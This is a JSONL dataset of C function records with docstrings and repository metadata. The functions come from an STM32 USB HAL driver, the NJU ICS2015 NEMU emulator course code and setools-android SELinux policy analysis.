{"docstring": "/**\n  * @brief  Flush an endpoint\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)", "code": "{\n  __HAL_LOCK(hpcd);\n  \n  if ((ep_addr & 0x80) == 0x80)\n  {\n    USB_FlushTxFifo(hpcd->Instance, ep_addr & 0x7F);\n  }\n  else\n  {\n    USB_FlushRxFifo(hpcd->Instance);\n  }\n  \n  __HAL_UNLOCK(hpcd); \n  \n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  This function handles PCD interrupt request.\n  * @param  hpcd: PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)", "code": "{\n  uint32_t wInterrupt_Mask = 0;\n  \n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_CTR))\n  {\n    /* servicing of the endpoint correct transfer interrupt */\n    /* clear of the CTR flag into the sub */\n    PCD_EP_ISR_Handler(hpcd);\n  }\n\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_RESET))\n  {\n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);\n    HAL_PCD_ResetCallback(hpcd);\n    HAL_PCD_SetAddress(hpcd, 0);\n  }\n\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_PMAOVR))\n  {\n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);    \n  }\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_ERR))\n  {\n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR); \n  }\n\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_WKUP))\n  {  \n    hpcd->Instance->CNTR &= ~(USB_CNTR_LP_MODE);\n    \n    /*set wInterrupt_Mask global variable*/\n    wInterrupt_Mask = USB_CNTR_CTRM  | USB_CNTR_WKUPM | USB_CNTR_SUSPM | USB_CNTR_ERRM \\\n      | USB_CNTR_ESOFM | USB_CNTR_RESETM;\n    \n    /*Set interrupt mask*/\n    hpcd->Instance->CNTR = wInterrupt_Mask;\n    \n    HAL_PCD_ResumeCallback(hpcd);\n    \n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);     \n  }\n\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_SUSP))\n  {\n    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */\n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);  \n    \n    /* Force low-power mode in the macrocell */\n    hpcd->Instance->CNTR |= USB_CNTR_FSUSP;\n    hpcd->Instance->CNTR |= USB_CNTR_LP_MODE;\n    if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_WKUP) == 0)\n    {\n      HAL_PCD_SuspendCallback(hpcd);\n    }\n  }\n\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_SOF))\n  {\n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF); \n    HAL_PCD_SOFCallback(hpcd);\n  }\n\n  if (__HAL_PCD_GET_FLAG (hpcd, USB_ISTR_ESOF))\n  {\n    /* clear ESOF flag in ISTR */\n    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF); \n  }\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Deactivate an endpoint\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)", "code": "{  \n  PCD_EPTypeDef *ep = NULL;\n  \n  if ((ep_addr & 0x80) == 0x80)\n  {\n    ep = &hpcd->IN_ep[ep_addr & 0x7F];\n  }\n  else\n  {\n    ep = &hpcd->OUT_ep[ep_addr & 0x7F];\n  }\n  ep->num   = ep_addr & 0x7F;\n  \n  ep->is_in = (0x80 & ep_addr) != 0;\n  \n  __HAL_LOCK(hpcd);\n  USB_DeactivateEndpoint(hpcd->Instance , ep);\n  __HAL_UNLOCK(hpcd);\n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/* ======== The following functions are already implemented. ======== */\n", "func_signal": "void SDL_SoftStretch(SDL_Surface *src, SDL_Rect *srcrect, \n\t\tSDL_Surface *dst, SDL_Rect *dstrect)", "code": "{\n\tassert(src && dst);\n\tint x = (srcrect == NULL ? 0 : srcrect->x);\n\tint y = (srcrect == NULL ? 0 : srcrect->y);\n\tint w = (srcrect == NULL ? src->w : srcrect->w);\n\tint h = (srcrect == NULL ? src->h : srcrect->h);\n\n\tassert(dstrect);\n\tif(w == dstrect->w && h == dstrect->h) {\n\t\t/* The source rectangle and the destination rectangle\n\t\t * are of the same size. If that is the case, there\n\t\t * is no need to stretch, just copy. */\n\t\tSDL_Rect rect;\n\t\trect.x = x;\n\t\trect.y = y;\n\t\trect.w = w;\n\t\trect.h = h;\n\t\tSDL_BlitSurface(src, &rect, dst, dstrect);\n\t}\n\telse {\n\t\t/* No other case occurs in NEMU-PAL. */\n\t\tassert(0);\n\t}\n}", "path": "game\\src\\nemu-pal\\hal\\video.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* i8259 internal */\n", "func_signal": "static void do_i8259()", "code": "{\n\tint8_t master_irq = master.highest_irq;\n\tif(master_irq == NO_INTR) {\n\t\t/* TODO: Uncomment the following line after the ``INTR'' member\n\t\t * is added to the CPU_state structure.\n\t\t */\n\t\t// cpu.INTR = false;\n\t\tpanic(\"uncomment the line above\");\n\t\treturn;\n\t}\n\telse if(master_irq == 2) {\n\t\tassert(slave.highest_irq != NO_INTR);\n\t\tmaster_irq = 8 + slave.highest_irq;\n\t}\n\n\tintr_NO = master_irq + IRQ_BASE;\n\t/* TODO: Uncomment the following line after the ``INTR'' member\n\t * is added to the CPU_state structure.\n\t */\n\t// cpu.INTR = true;\n\tpanic(\"uncomment the line above\");\n}", "path": "nemu\\src\\device\\i8259.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* read `len` bytes starting from `offset` of ramdisk into `buf` */\n", "func_signal": "void ramdisk_read(uint8_t *buf, uint32_t offset, uint32_t len)", "code": "{\n\tnemu_assert(offset + len < RAMDISK_SIZE);\n\tmemcpy(buf, RAMDISK_START + offset, len);\n}", "path": "kernel\\src\\driver\\ramdisk.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* \u7ed8\u5236\u5c4f\u5e55\u4e0a\u7684\u5185\u5bb9\u3002\n * \u6ce8\u610f\u7a0b\u5e8f\u5728\u7ed8\u56fe\u4e4b\u524d\u8c03\u7528\u4e86prepare_buffer\uff0c\u7ed3\u675f\u524d\u8c03\u7528\u4e86display_buffer\u3002\n * prepare_buffer\u4f1a\u51c6\u5907\u4e00\u4e2a\u7a7a\u767d\u7684\u7ed8\u56fe\u7f13\u51b2\u533a\uff0cdisplay_buffer\u5219\u4f1a\u5c06\u7f13\u51b2\u533a\u7ed8\u5236\u5230\u5c4f\u5e55\u4e0a\uff0c\n * draw_pixel\u6216draw_string\u7ed8\u5236\u7684\u5185\u5bb9\u5c06\u4fdd\u5b58\u5728\u7f13\u51b2\u533a\u5185(\u6682\u65f6\u4e0d\u4f1a\u663e\u793a\u5728\u5c4f\u5e55\u4e0a)\uff0c\u8c03\u7528\n * display_buffer\u540e\u624d\u4f1a\u663e\u793a\u3002\n*/\n", "func_signal": "void\nredraw_screen()", "code": "{\n\tfly_t it;\n\tconst char *hit, *miss;\n\t\n\tprepare_buffer(); /* \u51c6\u5907\u7f13\u51b2\u533a */\n\n\t/* \u7ed8\u5236\u6bcf\u4e2a\u5b57\u7b26 */\n\tfor (it = characters(); it != NULL; it = it->_next) {\n\t\tstatic char buf[2];\n\t\tbuf[0] = it->text + 'A'; buf[1] = 0;\n\t\tdraw_string(buf, F2int(it->x), it->y, 15);\n\t}\n\n\t/* \u7ed8\u5236\u547d\u4e2d\u6570\u3001miss\u6570\u3001\u6700\u540e\u4e00\u6b21\u6309\u952e\u626b\u63cf\u7801\u548cfps */\n\tdraw_string(itoa(last_key_code()), SCR_HEIGHT - 8, 0, 48);\n\thit = itoa(get_hit());\n\tdraw_string(hit, 0, SCR_WIDTH - strlen(hit) * 8, 10);\n\tmiss = itoa(get_miss());\n\tdraw_string(miss, SCR_HEIGHT - 8, SCR_WIDTH - strlen(miss) * 8, 12);\n\tdraw_string(itoa(get_fps()), 0, 0, 14);\n\tdraw_string(\"FPS\", 0, strlen(itoa(get_fps())) * 8, 14);\n\n\tdisplay_buffer(); /* \u7ed8\u5236\u7f13\u51b2\u533a */\n}", "path": "game\\src\\typing\\draw.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* Rules are used for many times.\n * Therefore we compile them only once before any usage.\n */\n", "func_signal": "void init_regex()", "code": "{\n\tint i;\n\tchar error_msg[128];\n\tint ret;\n\n\tfor(i = 0; i < NR_REGEX; i ++) {\n\t\tret = regcomp(&re[i], rules[i].regex, REG_EXTENDED);\n\t\tif(ret != 0) {\n\t\t\tregerror(ret, &re[i], error_msg, 128);\n\t\t\tAssert(ret == 0, \"regex compilation failed: %s\\n%s\", error_msg, rules[i].regex);\n\t\t}\n\t}\n}", "path": "nemu\\src\\monitor\\debug\\expr.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* We use the ``readline'' library to provide more flexibility to read from stdin. */\n", "func_signal": "char* rl_gets()", "code": "{\n\tstatic char *line_read = NULL;\n\n\tif (line_read) {\n\t\tfree(line_read);\n\t\tline_read = NULL;\n\t}\n\n\tline_read = readline(\"(nemu) \");\n\n\tif (line_read && *line_read) {\n\t\tadd_history(line_read);\n\t}\n\n\treturn line_read;\n}", "path": "nemu\\src\\monitor\\debug\\ui.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* CPU interface */\n", "func_signal": "uint32_t pio_read(ioaddr_t addr, size_t len)", "code": "{\n\tassert(len == 1 || len == 2 || len == 4);\n\tassert(addr + len - 1 < PORT_IO_SPACE_MAX);\n\tpio_callback(addr, len, false);\t\t// prepare data to read\n\tuint32_t data = *(uint32_t *)(pio_space + addr) & (~0u >> ((4 - len) << 3));\n\treturn data;\n}", "path": "nemu\\src\\device\\io\\port-io.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* Initialization phase 1\n * The assembly code in start.S will finally jump here.\n */\n", "func_signal": "void init()", "code": "{\n#ifdef IA32_PAGE\n\t/* We must set up kernel virtual memory first because our kernel thinks it \n\t * is located at 0xc0100000, which is set by the linking options in Makefile.\n\t * Before setting up correct paging, no global variable can be used. */\n\tinit_page();\n\n\t/* After paging is enabled, transform %esp to virtual address. */\n\tasm volatile(\"addl %0, %%esp\" : : \"i\"(KOFFSET));\n#endif\n\n\t/* Jump to init_cond() to continue initialization. */\n\tasm volatile(\"jmp *%0\" : : \"r\"(init_cond));\n\n\tpanic(\"should not reach here\");\n}", "path": "kernel\\src\\main.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* device interface */\n", "func_signal": "void i8259_raise_intr(int n)", "code": "{\n\tassert(n >= 0 && n < 16);\n\tif(n < 8) {\n\t\tmaster.IRR |= MASK(n);\n\t}\n\telse {\n\t\tn -= 8;\n\t\tslave.IRR |= MASK(n);\n\t\tmaster.IRR |= MASK(2);\n\n\t\tslave.highest_irq = ffo_table[slave.IRR & ~slave.IMR];\n\t}\n\n\tmaster.highest_irq = ffo_table[master.IRR & ~master.IMR];\n\n\tdo_i8259();\n}", "path": "nemu\\src\\device\\i8259.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* Load the palette into VGA. */\n", "func_signal": "void write_palette(void *colors, int nr_color)", "code": "{\n\tint i;\n\tuint8_t (*palette)[4] = colors;\n\tout_byte(VGA_DAC_WRITE_INDEX, 0);\n\tfor(i = 0; i < nr_color; i ++) {\n\t\tout_byte(VGA_DAC_DATA, palette[i][0] >> 2);\t// red\n\t\tout_byte(VGA_DAC_DATA, palette[i][1] >> 2);\t// green\n\t\tout_byte(VGA_DAC_DATA, palette[i][2] >> 2);\t// blue\n\t}\n}", "path": "game\\src\\common\\device\\palette.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* write `len` bytes starting from `buf` into the `offset` of ramdisk */\n", "func_signal": "void ramdisk_write(uint8_t *buf, uint32_t offset, uint32_t len)", "code": "{\n\tnemu_assert(offset + len < RAMDISK_SIZE);\n\tmemcpy(RAMDISK_START + offset, buf, len);\n}", "path": "kernel\\src\\driver\\ramdisk.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* \u6e38\u620f\u4e3b\u5faa\u73af\u3002\n * \u5728\u521d\u59cb\u5316\u5de5\u4f5c\u7ed3\u675f\u540e\uff0cmain\u51fd\u6570\u5c31\u8df3\u8f6c\u5230\u4e3b\u5faa\u73af\u6267\u884c\u3002\n * \u5728\u4e3b\u5faa\u73af\u6267\u884c\u671f\u95f4\u968f\u65f6\u4f1a\u63d2\u5165\u5f02\u6b65\u7684\u4e2d\u65ad\u3002\u65f6\u949f\u4e2d\u65ad\u6700\u7ec8\u8c03\u7528timer_event\uff0c\n * \u952e\u76d8\u4e2d\u65ad\u6700\u7ec8\u8c03\u7528keyboard_event\u3002\u4e2d\u65ad\u5904\u7406\u5b8c\u6210\u540e\u5c06\u8fd4\u56de\u4e3b\u5faa\u73af\u539f\u4f4d\u7f6e\u7ee7\u7eed\u6267\u884c\u3002\n *\n * tick\u662f\u65f6\u949f\u4e2d\u65ad\u4e2d\u7ef4\u62a4\u7684\u4fe1\u53f7\uff0c\u6570\u503c\u542b\u4e49\u662f\u201c\u7cfb\u7edf\u5230\u5f53\u524d\u65f6\u523b\u5df2\u7ecf\u53d1\u751f\u8fc7\u7684\u65f6\u949f\u4e2d\u65ad\u6570\u201d\n * HZ\u662f\u65f6\u949f\u63a7\u5236\u5668\u786c\u4ef6\u6bcf\u79d2\u4ea7\u751f\u7684\u4e2d\u65ad\u6570\uff0c\u5728include/device/timer.h\u4e2d\u5b9a\u4e49\n * now\u662f\u4e3b\u5faa\u73af\u5df2\u7ecf\u6b63\u786e\u5904\u7406\u7684\u65f6\u949f\u4e2d\u65ad\u6570\uff0c\u5373\u6e38\u620f\u5df2\u7ecf\u5904\u7406\u5230\u7684\u7269\u7406\u65f6\u95f4\u70b9\n * */\n", "func_signal": "void\nmain_loop(void)", "code": "{\n\tint now = 0, target;\n\tint num_draw = 0;\n\tbool redraw;\n\n\twhile (true) {\n\t\twait_intr();\n\t\tcli();\n\t\tif (now == tick) {\n\t\t\tsti();\n\t\t\tcontinue;\n\t\t}\n\t\tassert(now < tick);\n\t\ttarget = tick; /* now\u603b\u662f\u5c0f\u4e8etick\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u201c\u8ffd\u8d76\u201d\u5f53\u524d\u7684\u65f6\u95f4 */\n\t\tsti();\n\n\t\tredraw = false;\n\t\twhile (update_keypress())\n\t\t\t;\n\n\t\t/* \u4f9d\u6b21\u6a21\u62df\u5df2\u7ecf\u9519\u8fc7\u7684\u65f6\u949f\u4e2d\u65ad\u3002\u4e00\u6b21\u4e3b\u5faa\u73af\u5982\u679c\u6267\u884c\u65f6\u95f4\u957f\uff0c\u671f\u95f4\u53ef\u80fd\u5230\u6765\u591a\u6b21\u65f6\u949f\u4e2d\u65ad\uff0c\n\t\t * \u4ece\u800c\u4e3b\u5faa\u73af\u4e2d\u7ef4\u62a4\u7684\u65f6\u949f\u53ef\u80fd\u4e0e\u5b9e\u9645\u65f6\u949f\u76f8\u5dee\u8f83\u591a\u3002\u4e3a\u4e86\u7ef4\u6301\u6e38\u620f\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5fc5\u987b\u8865\u4e0a\n\t\t * \u671f\u95f4\u9519\u8fc7\u7684\u6bcf\u4e00\u5e27\u6e38\u620f\u903b\u8f91\u3002 */\n\t\twhile (now < target) { \n\t\t\t/* \u6bcf\u9694\u4e00\u5b9a\u65f6\u95f4\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26 */\n\t\t\tif (now % (HZ / CHARACTER_PER_SECOND) == 0) {\n\t\t\t\tcreate_new_letter();\n\t\t\t} \n\t\t\t/* \u6bcf\u9694\u4e00\u5b9a\u65f6\u95f4\u66f4\u65b0\u5c4f\u5e55\u4e0a\u5b57\u7b26\u7684\u4f4d\u7f6e */\n\t\t\tif (now % (HZ / UPDATE_PER_SECOND) == 0) {\n\t\t\t\tupdate_letter_pos();\n\t\t\t}\n\t\t\t/* \u6bcf\u9694\u4e00\u5b9a\u65f6\u95f4\u9700\u8981\u5237\u65b0\u5c4f\u5e55\u3002\u6ce8\u610f\u5230\u8fd9\u91cc\u5b9e\u73b0\u4e86\u201c\u8df3\u5e27\u201d\u7684\u673a\u5236\uff1a\u5047\u8bbe\n\t\t\t *   HZ = 1000, FPS = 100, now = 10, target = 1000\n\t\t\t * \u5373\u6211\u4eec\u8981\u6a21\u62df990\u4e2a\u65f6\u949f\u4e2d\u65ad\u4e4b\u95f4\u53d1\u751f\u7684\u4e8b\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e869\u6b21\u5c4f\u5e55\u66f4\u65b0\uff0c\n\t\t\t * \u4f46redraw flag\u53ea\u88ab\u7f6e\u4e00\u6b21\u3002 */\n\t\t\tif (now % (HZ / FPS) == 0) {\n\t\t\t\tredraw = true;\n\t\t\t}\n\t\t\t/* \u66f4\u65b0fps\u7edf\u8ba1\u4fe1\u606f */\n\t\t\tif (now % (HZ / 2) == 0) {\n\t\t\t\tint now_fps = num_draw * 2 + 1;\n\t\t\t\tif (now_fps > FPS) now_fps = FPS;\n\t\t\t\tset_fps(now_fps);\n\t\t\t\tnum_draw = 0;\n\t\t\t}\n\t\t\tnow ++;\n\t\t}\n\n\t\tif (redraw) { /* \u5f53\u9700\u8981\u91cd\u65b0\u7ed8\u56fe\u65f6\u91cd\u7ed8 */\n\t\t\tnum_draw ++;\n\t\t\tredraw_screen();\n\t\t}\n\t}\n}", "path": "game\\src\\typing\\game.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* __attribute__((__noinline__))  here is to disable inlining for this function to avoid some optimization problems for gcc 4.7 */\n", "func_signal": "void __attribute__((__noinline__)) \nprintk(const char *ctl, ...)", "code": "{\n#ifndef HAS_DEVICE\n\treturn;\n#endif\n\tstatic char buf[256];\n\tvoid *args = (void **)&ctl + 1;\n\tint len = vsnprintf(buf, 256, ctl, args);\n\tint i;\n\tfor(i = 0; i < len; i ++) {\n\t\tserial_printc(buf[i]);\n\t}\n}", "path": "kernel\\src\\lib\\printk.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* Print the palette in use. */\n", "func_signal": "void read_palette()", "code": "{\n\tint i;\n\tuint8_t r,g,b;\n\tout_byte(VGA_DAC_READ_INDEX, 0);\n\tfor(i = 0; i < NR_PALETTE_ENTRY; i ++) {\n\t\tr = in_byte(VGA_DAC_DATA);\n\t\tg = in_byte(VGA_DAC_DATA);\n\t\tb = in_byte(VGA_DAC_DATA);\n\t\tprintf(\"r = %x, g = %x, b = %x\\n\", r, g, b);\n\t}\n}", "path": "game\\src\\common\\device\\palette.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* Initialization phase 2 */\n", "func_signal": "void init_cond()", "code": "{\n#ifdef IA32_INTR\n\t/* Reset the GDT, since the old GDT in start.S cannot be used in the future. */\n\tinit_segment();\n\n\t/* Set the IDT by setting up interrupt and exception handlers.\n\t * Note that system call is the only exception implemented in NEMU.\n\t */\n\tinit_idt();\n#endif\n\n#ifdef HAS_DEVICE\n\t/* Initialize the intel 8259 PIC (Programmable interrupt controller). */\n\tinit_i8259();\n\n\t/* Initialize the serial port. After that, you can use printk() to output messages. */\n\tinit_serial();\n\n\t/* Initialize the IDE driver. */\n\tinit_ide();\n\n\t/* Enable interrupts. */\n\tsti();\n#endif\n\n#ifdef IA32_PAGE\n\t/* Initialize the memory manager. */\n\tinit_mm();\n#endif\n\n\t/* Output a welcome message.\n\t * Note that the output is actually performed only when\n\t * the serial port is available in NEMU.\n\t */\n\tLog(\"Hello, NEMU world!\");\n\n#if defined(IA32_PAGE) && defined(HAS_DEVICE)\n\t/* Write some test data to the video memory. */\n\tvideo_mapping_write_test();\n#endif\n\n\t/* Load the program. */\n\tuint32_t eip = loader();\n\t\n#if defined(IA32_PAGE) && defined(HAS_DEVICE)\n\t/* Read data in the video memory to check whether \n\t * the test data is written sucessfully.\n\t */\n\tvideo_mapping_read_test();\n\n\t/* Clear the test data we just written in the video memory. */\n\tvideo_mapping_clear();\n#endif\n\n#ifdef IA32_PAGE\n\t/* Set the %esp for user program, which is one of the\n\t * convention of the \"advanced\" runtime environment. */\n\tasm volatile(\"movl %0, %%esp\" : : \"i\"(KOFFSET));\n#endif\n\n\t/* Keep the `bt' command happy. */\n\tasm volatile(\"movl $0, %ebp\");\n\tasm volatile(\"subl $16, %esp\");\n\n\t/* Here we go! */\n\t((void(*)(void))eip)();\n\n\tpanic(\"should not reach here\");\n}", "path": "kernel\\src\\main.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* This function is defined only to make the newlibc linkable.\n * Without it, errors will be reported during linking.\n * But the execution flow should not reach here.\n */\n", "func_signal": "void* sbrk(int incr)", "code": "{\n\tpanic(\"should not reach here\");\n\treturn NULL;\n}", "path": "kernel\\src\\lib\\misc.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* device interface */\n", "func_signal": "void* add_pio_map(ioaddr_t addr, size_t len, pio_callback_t callback)", "code": "{\n\tassert(nr_map < NR_MAP);\n\tassert(addr + len <= PORT_IO_SPACE_MAX);\n\tmaps[nr_map].low = addr;\n\tmaps[nr_map].high = addr + len - 1;\n\tmaps[nr_map].callback = callback;\n\tnr_map ++;\n\treturn pio_space + addr;\n}", "path": "nemu\\src\\device\\io\\port-io.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/*++\n  Purpose:\n\n    Set the caption of the window. For compatibility with SDL2 only.\n\n  Parameters:\n\n    [IN]  lpszCaption - the new caption of the window.\n\n    [IN]  lpReserved - not used, for compatibility only.\n\n  Return value:\n\n    None.\n\n--*/\n", "func_signal": "VOID\nSDL_WM_SetCaption(\n   LPCSTR         lpszCaption,\n   LPVOID         lpReserved\n)", "code": "{\n   if (gpWindow != NULL)\n   {\n      SDL_SetWindowTitle(gpWindow, lpszCaption);\n   }\n}", "path": "game\\src\\nemu-pal\\device\\video.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* This function is defined only to make the newlibc linkable.\n * Without it, errors will be reported during linking.\n * But the execution flow should not reach here.\n */\n", "func_signal": "void *sbrk(int incr)", "code": "{\n\tnemu_assert(0);\n\treturn NULL;\n}", "path": "testcase\\src\\hello-str.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/* \u6ce8\u610f\uff01itoa\u53ea\u6709\u4e00\u4e2a\u7f13\u51b2\uff0c\u56e0\u6b64\n * char *p = itoa(100);\n * char *q = itoa(200);\n * \u540ep\u548cq\u6240\u6307\u5185\u5bb9\u90fd\u662f\"200\"\u3002\n */\n", "func_signal": "static char *itoa(int a)", "code": "{\n\tstatic char buf[30];\n\tsnprintf(buf, 30, \"%d\", a);\n\treturn buf;\n}", "path": "game\\src\\typing\\draw.c", "repo_name": "NJU-ProjectN/ics2015", "stars": 133, "license": "None", "language": "c", "size": 2448}
{"docstring": "/**\n * Find the attributes that both typeA and typeB have.  Create a\n * vector of those attributes (as represented as qpol_type_t pointers\n * relative to the provided policy) and set r->attribs to that vector.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_common_attribs(const apol_policy_t * p,\n\t\t\t\t\t      const qpol_type_t * typeA, const qpol_type_t * typeB,\n\t\t\t\t\t      apol_types_relation_result_t * r)", "code": "{\n\tqpol_iterator_t *iA = NULL, *iB = NULL;\n\tapol_vector_t *vA = NULL, *vB = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_attr_iter(p->p, typeA, &iA) < 0 || qpol_type_get_attr_iter(p->p, typeB, &iB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((vA = apol_vector_create_from_iter(iA, NULL)) == NULL ||\n\t    (vB = apol_vector_create_from_iter(iB, NULL)) == NULL ||\n\t    (r->attribs = apol_vector_create_from_intersection(vA, vB, NULL, NULL)) == NULL) {\n\t\tERR(p, \"%s\", strerror(errno));\n\t}\n\n\tretval = 0;\n      cleanup:\n\tqpol_iterator_destroy(&iA);\n\tqpol_iterator_destroy(&iB);\n\tapol_vector_destroy(&vA);\n\tapol_vector_destroy(&vB);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find (some) transitive information flows between the two types.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param do_transAB 1 if to find paths from type A to B, 0 to skip.\n * @param do_transBA 1 if to find paths from type B to A, 0 to skip.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_transflow(const apol_policy_t * p,\n\t\t\t\t\t const qpol_type_t * typeA,\n\t\t\t\t\t const qpol_type_t * typeB,\n\t\t\t\t\t unsigned int do_transAB, unsigned int do_transBA, apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_infoflow_analysis_t *ia = NULL;\n\tapol_vector_t *v = NULL;\n\tapol_infoflow_graph_t *g = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((ia = apol_infoflow_analysis_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_infoflow_analysis_set_mode(p, ia, APOL_INFOFLOW_MODE_TRANS) < 0 ||\n\t    apol_infoflow_analysis_set_dir(p, ia, APOL_INFOFLOW_OUT) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif (do_transAB) {\n\t\tif (apol_infoflow_analysis_set_type(p, ia, nameA) < 0 || apol_infoflow_analysis_do(p, ia, &v, &g) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif ((r->transAB = apol_vector_create(infoflow_result_free)) == NULL) {\n\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif (apol_types_relation_clone_infoflow(p, v, nameB, r->transAB) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tif (do_transBA) {\n\t\tapol_vector_destroy(&v);\n\t\tif ((do_transAB &&\n\t\t     apol_infoflow_analysis_do_more(p, g, nameB, &v) < 0) ||\n\t\t    (!do_transAB &&\n\t\t     (apol_infoflow_analysis_set_type(p, ia, nameB) < 0 || apol_infoflow_analysis_do(p, ia, &v, &g) < 0))) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif ((r->transBA = apol_vector_create(infoflow_result_free)) == NULL) {\n\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif (apol_types_relation_clone_infoflow(p, v, nameA, r->transBA) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&v);\n\tapol_infoflow_analysis_destroy(&ia);\n\tapol_infoflow_graph_destroy(&g);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
